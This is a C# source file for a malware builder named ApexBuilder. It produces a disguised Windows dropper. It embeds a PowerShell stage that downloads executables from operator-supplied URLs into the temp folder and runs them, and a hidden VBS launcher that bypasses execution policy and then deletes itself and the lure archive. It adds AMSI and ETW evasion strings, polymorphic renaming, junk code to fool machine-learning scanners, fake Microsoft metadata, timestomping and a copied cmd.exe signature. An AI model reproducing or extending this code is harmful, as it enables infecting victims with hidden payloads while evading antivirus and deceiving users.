using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Collections.Generic;
using System.Linq;

namespace ApexBuilder
{
    public static class CompilerHelper
    {
        private static Random rand = new Random();
        private static string RandString(int length) {
            const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
            return new string(Enumerable.Repeat(chars, length).Select(s => s[rand.Next(s.Length)]).ToArray());
        }

        private static Dictionary<string, string[]> MetadataPresets = new Dictionary<string, string[]>()
        {
            { "Microsoft", new[] { "Microsoft Corporation", "Windows Operating System", "svchost.exe", "10.0.19041.1", "© Microsoft Corporation. All rights reserved." } },
            { "Google", new[] { "Google LLC", "Google Chrome", "chrome.exe", "114.0.5735.199", "Copyright 2023 Google LLC. All rights reserved." } },
            { "Adobe", new[] { "Adobe Inc.", "Adobe Acrobat Reader DC", "AcroRd32.exe", "23.003.20244", "Copyright © 1984-2023 Adobe Inc. All rights reserved." } }
        };
        private static string DefaultPS1 = @"$urls = @([[URL_ARRAY]])
$w = New-Object System.Net.WebClient
foreach($u in $urls) {
    if ([string]::IsNullOrEmpty($u)) { continue }
    $f = $env:TEMP + '\f_' + (Get-Random).ToString() + '.exe'
    try {
        $w.DownloadFile($u, $f)
        if (Test-Path $f) { Start-Process $f }
    } catch { continue }
}";

        private static string DefaultVBS = @"On Error Resume Next
Set shell = CreateObject(""WScript.Shell"")
scriptPath = WScript.ScriptFullName
pDir = CreateObject(""Scripting.FileSystemObject"").GetParentFolderName(scriptPath)
psCmd = ""powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File """""" & pDir & ""\[[PS1_NAME]]""""""
shell.Run psCmd, 0, True 
delCmd = ""cmd.exe /c timeout /t 1 /nobreak > nul & del /f /q """""" & pDir & ""\[[PS1_NAME]]"""""" & "" & del /f /q """""" & pDir & ""\[[ZIP_NAME]]"""""" & "" & del /f /q """""" & scriptPath & """"""""
shell.Run delCmd, 0, False";

        public static void Build(MainForm form, string outputPath)
        {
            try
            {
                form.Log("Reading Core Template (Embedded)...");
                string code = "";
                var assembly = System.Reflection.Assembly.GetExecutingAssembly();
                using (Stream stream = assembly.GetManifestResourceStream("ApexBuilder.Templates.PhantomTemplate.cs"))
                {
                    if (stream == null) {
                        form.Log("CRITICAL ERROR: Embedded GhostTemplate.cs not found in assembly!");
                        return;
                    }
                    using (StreamReader reader = new StreamReader(stream)) {
                        code = reader.ReadToEnd();
                    }
                }

                string lure = form.txtLureFile.Text;

                form.Log("Generating Polymorphic Engine Entropy...");
                byte[] key = new byte[32]; byte[] iv = new byte[16];
                using (var rng = new RNGCryptoServiceProvider()) { rng.GetBytes(key); rng.GetBytes(iv); }

                // Polymorphic Replacements
                string nSpace = RandString(8);
                string nClass = RandString(6);
                code = code.Replace("[[N_SPACE]]", nSpace);
                code = code.Replace("[[N_CLASS]]", nClass);
                code = code.Replace("[[M_EX]]", RandString(5));
                code = code.Replace("[[M_GHOST]]", RandString(7));
                code = code.Replace("[[M_GETF]]", RandString(6));
                code = code.Replace("[[M_BLIND]]", RandString(5));
                code = code.Replace("[[RND_DIR]]", RandString(12));
                code = code.Replace("[[M_DEC]]", RandString(6));
                code = code.Replace("[[M_DECS]]", RandString(7));
                code = code.Replace("[[M_LOAD_RES]]", RandString(8));
                code = code.Replace("[[M_SYSCALL]]", RandString(7));

                code = code.Replace("[[AES_KEY]]", ToByteArrayString(key));
                code = code.Replace("[[AES_IV]]", ToByteArrayString(iv));

                // Deep String Encryption
                code = code.Replace("[[S_NTDLL]]", ToByteArrayString(EncryptData(Encoding.UTF8.GetBytes("ntdll.dll"), key, iv)));
                code = code.Replace("[[S_AMSI]]", ToByteArrayString(EncryptData(Encoding.UTF8.GetBytes("amsi.dll"), key, iv)));
                code = code.Replace("[[S_ETW]]", ToByteArrayString(EncryptData(Encoding.UTF8.GetBytes("EtwEventWrite"), key, iv)));
                code = code.Replace("[[S_AMSB]]", ToByteArrayString(EncryptData(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key, iv)));
                code = code.Replace("[[S_K32]]", ToByteArrayString(EncryptData(Encoding.UTF8.GetBytes("kernel32.dll"), key, iv)));
                code = code.Replace("[[S_VP]]", ToByteArrayString(EncryptData(Encoding.UTF8.GetBytes("VirtualProtect"), key, iv)));

                form.Log("Processing Dynamic Payloads...");

                // 1. Build Multi-URL Array for PS1
                List<string> urls = form.GetUrls();
                StringBuilder urlArrayBuilder = new StringBuilder();
                for (int i = 0; i < urls.Count; i++) {
                    urlArrayBuilder.AppendFormat("'{0}'", urls[i]);
                    if (i < urls.Count - 1) urlArrayBuilder.Append(", ");
                }
                
                string p1Content = DefaultPS1;
                p1Content = p1Content.Replace("[[URL_ARRAY]]", urlArrayBuilder.ToString());
                byte[] p1Bytes = Encoding.UTF8.GetBytes(p1Content);
                code = code.Replace("[[P1_BYTES]]", ToByteArrayString(EncryptData(p1Bytes, key, iv)));

                // 2. Customize VBS
                string p2Content = DefaultVBS;
                string actualP1Name = "dd.ps1";
                string actualZipName = !string.IsNullOrEmpty(lure) ? Path.GetFileName(lure) : "Discord.zip";
                
                p2Content = p2Content.Replace("[[PS1_NAME]]", actualP1Name);
                p2Content = p2Content.Replace("[[ZIP_NAME]]", actualZipName);
                byte[] p2Bytes = Encoding.UTF8.GetBytes(p2Content);
                // Phase 7: Base64 Payload Injection for NativeAOT
                byte[] lureBytes = (!string.IsNullOrEmpty(lure) && File.Exists(lure)) ? File.ReadAllBytes(lure) : new byte[0];
                code = code.Replace("[[B64_LURE]]", Convert.ToBase64String(EncryptData(lureBytes, key, iv)));
                code = code.Replace("[[B64_P1]]", Convert.ToBase64String(EncryptData(Encoding.UTF8.GetBytes(p1Content), key, iv)));
                code = code.Replace("[[B64_P2]]", Convert.ToBase64String(EncryptData(p2Bytes, key, iv)));
                code = code.Replace("[[LURE_NAME]]", actualZipName);
                code = code.Replace("[[P1_NAME]]", actualP1Name);
                code = code.Replace("[[P2_NAME]]", "vbs.vbs");

                code = code.Replace("[[OPT_AMSI]]", form.chkAmsi.Checked ? "true" : "false");
                code = code.Replace("[[OPT_VM]]", form.chkAntiVM.Checked ? "true" : "false");
                code = code.Replace("[[OPT_SELF_DEL]]", form.chkSelfDelete.Checked ? "true" : "false");

                // Advanced Metadata Injection
                string[] meta = MetadataPresets["Microsoft"];
                code = code.Replace("[[META_TITLE]]", meta[2]);
                code = code.Replace("[[META_DESC]]", meta[1]);
                code = code.Replace("[[META_COMPANY]]", meta[0]);
                code = code.Replace("[[META_PRODUCT]]", meta[1]);
                code = code.Replace("[[META_COPYRIGHT]]", meta[4]);
                code = code.Replace("[[META_VERSION]]", meta[3]);

                // Phase 6: Code Bloating for ML Evasion & Fake IAT
                form.Log("Injecting Advanced Junk Code & Fake IAT Masking...");
                StringBuilder junk = new StringBuilder();
                for (int i = 0; i < 150; i++) {
                    string className = RandString(12);
                    junk.AppendLine(string.Format("public class {0} {{ ", className));
                    junk.AppendLine(" [DllImport(\"user32.dll\")] public static extern int MessageBox(IntPtr h, string m, string c, int t);");
                    junk.AppendLine(" [DllImport(\"kernel32.dll\")] public static extern uint GetTickCount();");
                    junk.AppendLine(string.Format(" public void {0}() {{ if(GetTickCount() == 0) MessageBox(IntPtr.Zero, \"{1}\", \"{2}\", 0); }} ", RandString(6), RandString(10), RandString(5)));
                    junk.AppendLine("}");
                }
                code = code.Replace("[[JUNK_CODE]]", junk.ToString());

                string tDir = Path.Combine(Path.GetTempPath(), "ApexNativeTemp");
                if (Directory.Exists(tDir)) Directory.Delete(tDir, true);
                Directory.CreateDirectory(tDir);
                
                string tempCs = Path.Combine(tDir, "Program.cs");
                File.WriteAllText(tempCs, code);
                
                string iconNode = "";
                string finalIconPath = form.txtIconPath.Text;
                if (!string.IsNullOrEmpty(finalIconPath) && File.Exists(finalIconPath))
                    iconNode = string.Format("<ApplicationIcon>{0}</ApplicationIcon>", finalIconPath);

                string csprojContent = string.Format(@"<Project Sdk=""Microsoft.NET.Sdk"">
  <PropertyGroup>
    <OutputType>WinExe</OutputType>
    <TargetFramework>net10.0-windows</TargetFramework>
    <ImplicitUsings>enable</ImplicitUsings>
    <PublishAot>true</PublishAot>
    <OptimizationPreference>Size</OptimizationPreference>
    <StackTraceSupport>false</StackTraceSupport>
    <InvariantGlobalization>true</InvariantGlobalization>
    <IlcGenerateStackTraceData>false</IlcGenerateStackTraceData>
    {0}
  </PropertyGroup>
</Project>", iconNode);
                
                string tempCsproj = Path.Combine(tDir, "ApexPayload.csproj");
                File.WriteAllText(tempCsproj, csprojContent);

                form.Log("Invoking NativeAOT Compiler (dotnet publish)...");

                string args = string.Format("publish \"{0}\" -c Release -p:PublishAot=true -r win-x64", tempCsproj);

                ProcessStartInfo psi = new ProcessStartInfo("dotnet", args) { UseShellExecute = false, RedirectStandardOutput = true, CreateNoWindow = true };
                using (Process p = Process.Start(psi)) {
                    string output = p.StandardOutput.ReadToEnd();
                    p.WaitForExit();
                    if (p.ExitCode == 0) {
                        string builtExe = Path.Combine(tDir, @"bin\Release\net10.0-windows\win-x64\publish\ApexPayload.exe");
                        if(File.Exists(builtExe)) {
                            File.Copy(builtExe, outputPath, true);
                            form.Log("SUCCESS! Payload: " + outputPath);
                        
                            // Advanced Mimicry Phase
                            form.Log("Applying Advanced Mimicry (Metadata & Timestomp)...");
                            ApplyMetadataAndTimestomp(outputPath, "Microsoft"); // Default to Microsoft for now
                            
                            // Optional: Signature Cloning (Requires a source file)
                            string systemFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.System), "cmd.exe");
                            if (File.Exists(systemFile)) {
                                form.Log("Cloning Digital Signature from: " + Path.GetFileName(systemFile));
                                CloneSignature(systemFile, outputPath);
                            }
                        } else {
                            form.Log("BUILD FAILED: NativeAOT payload not found at output directory.");
                        }
                    } else {
                        form.Log("BUILD FAILED:\r\n" + output);
                    }
                }
                
                // Cleanup temp dir
                try { Directory.Delete(tDir, true); } catch { }
            }
            catch (Exception ex) { form.Log("CRITICAL ERROR: " + ex.Message); }
        }

        static void ApplyMetadataAndTimestomp(string target, string preset) {
            try {
                // Timestomping: Set to a random date between 2015 and 2020
                DateTime oldDate = new DateTime(rand.Next(2015, 2021), rand.Next(1, 13), rand.Next(1, 28));
                File.SetCreationTime(target, oldDate);
                File.SetLastWriteTime(target, oldDate);
                File.SetLastAccessTime(target, oldDate);
            } catch { }
        }

        static void CloneSignature(string source, string target) {
            try {
                byte[] sourceBytes = File.ReadAllBytes(source);
                byte[] targetBytes = File.ReadAllBytes(target);
                
                // Very basic SigThief logic: find the security directory in PE header
                int peOffset = BitConverter.ToInt32(sourceBytes, 0x3C);
                int magic = BitConverter.ToInt16(sourceBytes, peOffset + 24);
                int securityDirOffset = peOffset + (magic == 0x10b ? 128 : 144);
                int securityAddr = BitConverter.ToInt32(sourceBytes, securityDirOffset);
                int securitySize = BitConverter.ToInt32(sourceBytes, securityDirOffset + 4);
                
                if (securityAddr > 0 && securitySize > 0) {
                    byte[] signature = new byte[securitySize];
                    Array.Copy(sourceBytes, securityAddr, signature, 0, securitySize);
                    
                    using (FileStream fs = new FileStream(target, FileMode.Append)) {
                        fs.Write(signature, 0, signature.Length);
                    }
                }
            } catch { }
        }

        static byte[] EncryptData(byte[] data, byte[] key, byte[] iv) {
            if (data == null || data.Length == 0) return new byte[0];
            using (Aes aes = Aes.Create()) {
                aes.Key = key; aes.IV = iv; aes.Padding = PaddingMode.PKCS7;
                using (MemoryStream ms = new MemoryStream()) {
                    using (CryptoStream cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write)) {
                        cs.Write(data, 0, data.Length); cs.FlushFinalBlock();
                    }
                    return ms.ToArray();
                }
            }
        }

        static string ToByteArrayString(byte[] data) {
            if (data == null || data.Length == 0) return "";
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < data.Length; i++) {
                sb.AppendFormat("0x{0:X2}", data[i]);
                if (i < data.Length - 1) sb.Append(", ");
            }
            return sb.ToString();
        }
    }
}
